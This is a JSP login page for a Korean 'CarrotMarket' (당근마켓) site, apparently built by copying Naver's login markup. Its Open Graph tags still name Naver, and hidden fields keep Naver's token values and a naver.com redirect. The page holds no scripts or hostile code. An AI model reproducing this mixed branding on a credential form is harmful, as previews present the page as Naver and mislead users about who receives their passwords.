<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta property="og:type" content="website">
    <meta property="og:title" content="네이버">
    <meta property="og:description" content="네이버에 로그인 하고 나를 위한 다양한 서비스를 이용해 보세요">
    <meta property="og:image" content="https://ssl.pstatic.net/static/nid/account/naver_og_image.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <title>당근마켓 :: 로그인</title>
    
   
</head>
<body>
<div id="wrap" class="wrap">

    <header class="header" role="banner" >
        <div class="header_inner">
            <a   href="#" class="logo">
                <h1 class="blind">CarrotMarket</h1>
            </a>
        </div>
    </header>

    <div id="container" class="container">
        <!-- content -->
        <div class="content">
            <div class="login_wrap">
                <ul class="menu_wrap" role="tablist">
                    <li class="menu_item" role="presentation">
                        <!--[주] 탭메뉴 활성화시(=선택시) "on"을 추가해주세요. 접근성: ariaselected는 탭 선택시 true, 미선택시 false로 적용-->
                        <!--[주:접근성] 탭메뉴의 id 값과 탭내용의 ariacontrols를 연결하고 있습니다. -->
                        <a href="#none" id="loinid" class="menu_id on" role="tab" aria-selected="true">
                            <span class="menu_text"><span class="text">ID 로그인</span></span>
                        </a>
                    </li>
                    <li class="menu_item" role="presentation">
                        <a href="#none" id="ones" class="menu_ones" role="tab" aria-selected="false">
                            <span class="menu_text"><span class="text">일회용 번호</span></span>
                        </a>
                    </li>
                    <li class="menu_item" role="presentation">
                        <a href="#none" id="qrcode" class="menu_qr" role="tab" aria-selected="false">
                            <span class="menu_text"><span class="text">QR코드</span></span>
                        </a>
                        <!--넛지배너-->
                        
                    </li>
                </ul>
                <form id="frmNIDLogin" name="frmNIDLogin" target="_top" AUTOCOMPLETE="off"
                      action="/member/login" method="POST">
                    <input type="hidden" id="localechange" name="localechange" value="">
                    <input type="hidden" name="dynamicKey" id="dynamicKey" value="4GnUQ6_5Boub8haqjJn4Z6RY0cTYdNNOyMINvLk2_Es0mxsqysARHj5FCz-ywxpfcFF92RW3uiJDkn8J41mpD9HCFNfwsLQNynh4LyLJ2Cs">
                    <input type="hidden" name="encpw" id="encpw" value="">
<input type="hidden" name="enctp" id="enctp" value="1">
<input type="hidden" name="svctype" id="svctype" value="1">
<input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
<input type="hidden" name="bvsd" id="bvsd" value="">
<input type="hidden" name="encnm" id="encnm" value="">
<input type="hidden" name="locale" id="locale" value="ko_KR">
<input type="hidden" name="url" id="url" value="https://www.naver.com">


                    <ul class="panel_wrap">
                        <li class="panel_item" style="display: block;">
                            <div class="panel_inner" role="tabpanel" aria-controls="loinid">
                                <div class="id_pw_wrap">
                                    <div class="input_row" id="id_line">
                                        <div class="icon_cell" id="id_cell">
                                            <span class="icon_id">
                                                <span class="blind">아이디</span>
                                            </span>
                                        </div>
                                        <input type="text" id="id" name="id" placeholder="아이디" title="아이디"
                                               class="input_text" maxlength="41"
                                               value="">
                                        <span role="button" class="btn_delete" id="id_clear" style="display: none;">
                                            <span class="icon_delete">
												<span class="blind">삭제</span>
                                            </span>
                                        </span>
                                    </div>
                                    <div class="input_row" id="pw_line">
                                        <div class="icon_cell" id="pw_cell">
                                            <span class="icon_pw">
                                                <span class="blind">비밀번호</span>
                                            </span>
                                        </div>
                                        <input type="password" id="pw" name="pw" placeholder="비밀번호" title="비밀번호"
                                               class="input_text" maxlength="16">
                                        <span role="button" class="btn_delete" id="pw_clear" style="display: none;">
                                            <span class="icon_delete">
                                                <span class="blind">삭제</span>
                                            </span>
                                        </span>
                                    </div>
                                </div>
                                <div class="login_keep_wrap" id="login_keep_wrap">
                                    <div class="keep_check">
                                        <input type="checkbox" id="keep" name="nvlong"
                                               class="input_keep"  value="off">
                                        <label for="keep" class="keep_text">로그인 상태 유지</label>
                                    </div>
                                    <div class="ip_check">
                                        <a href="#" target="_blank" id="ipguide" title="IP보안"><span class="ip_text">IP보안</span></a>
                                        <span class="switch">
                                            <input type="checkbox" id="switch"
                                                   class="switch_checkbox" value="off">
                                            <label for="switch" class="switch_btn">
                                                <span class="blind" id="switch_blind">OFF</span>
                                            </label>
                                        </span>
                                    </div>
                                </div>

                                <div class="login_error_wrap" id="err_capslock" style="display: none;">
                                    <div class="error_message">
                                        <strong>CapsLock</strong>이 켜져 있습니다.
                                    </div>
                                </div>

                                <div class="login_error_wrap" id="err_empty_id" style="display: none;">
                                    <div class="error_message">
                                        <strong>아이디</strong>를 입력해 주세요.
                                    </div>
                                </div>

                                <div class="login_error_wrap" id="err_empty_pw" style="display: none;">
                                    <div class="error_message">
                                        <strong>비밀번호</strong>를 입력해 주세요.
                                    </div>
                                </div>
                                <div class="login_error_wrap" id="err_common"  style="display:none;">
                                    <div class="error_message"
                                         style="width:90%">
                                        
                                    </div>
                                </div>
                                <div class="btn_login_wrap">

                                    <button type="submit" class="btn_login" id="btn_login">
                                        <span class="btn_text" >로그인</span>
                                    </button>

                                </div>
                            </div>
                        </li>
                    </ul>
                </form>
            </div>
            <ul class="find_wrap" id="find_wrap">

                <li><a href="#" class="find_text">비밀번호 찾기</a></li>
                <li><a href="#" class="find_text">아이디 찾기</a></li>
                <li><a target="_self" href="/member/join" class="find_text" style="color:#fe7f41;font-size: 1.1em;"><strong>회원가입</strong></a>
                </li>

            </ul>
            <!--배너-->
            <div id="gladbanner" class="banner_wrap">
                &nbsp;
            </div>
        </div>
        <!-- //content -->
    </div>

    <!-- footer -->
    <div class="footer">
        <div class="footer_inner">
            <!--[주]고객센터,제휴문의,서비스안내-->
           
            <div class="footer_copy">
                <a id="fot.naver" target="_blank" href="#">
                    <span class="footer_logo"><span class="blind">당근마켓</span></span>
                </a>
                <span class="text">Copyright</span>
                <span class="corp">© CarrotMarket Corp.</span>
                <span class="text">All Rights Reserved.</span>
            </div>		
        </div>
    </div>

</div>
<input type="hidden" id="nclicks_nsc" name="nclicks_nsc" value="nid.login_kr">
<input type="hidden" id="nid_buk" name="nid_buk" value="exist">
<input type="hidden" id="removeLink" name="removeLink" value="">
<input type="hidden" id="hide_util" name="hide_util" value="">
<input type="hidden" id="ncaptchaSplit" name="ncaptchaSplit" value="none">
<input type="hidden" id="id_error_msg" name="id_error_msg" value="<strong>아이디</strong>를 입력해주세요.">
<input type="hidden" id="pw_error_msg" name="pw_error_msg" value="<strong>비밀번호</strong>를 입력해주세요.">
<input type="hidden" id="locale" name="locale" value="ko_KR">
<input type="hidden" id="adult_surl_v2" name="adult_surl_v2" value="">
<input type="hidden" id="ispopup" name="ispopup" value="false">

<div id="nv_stat" style="display:none;">20</div>
</body>
 
</html>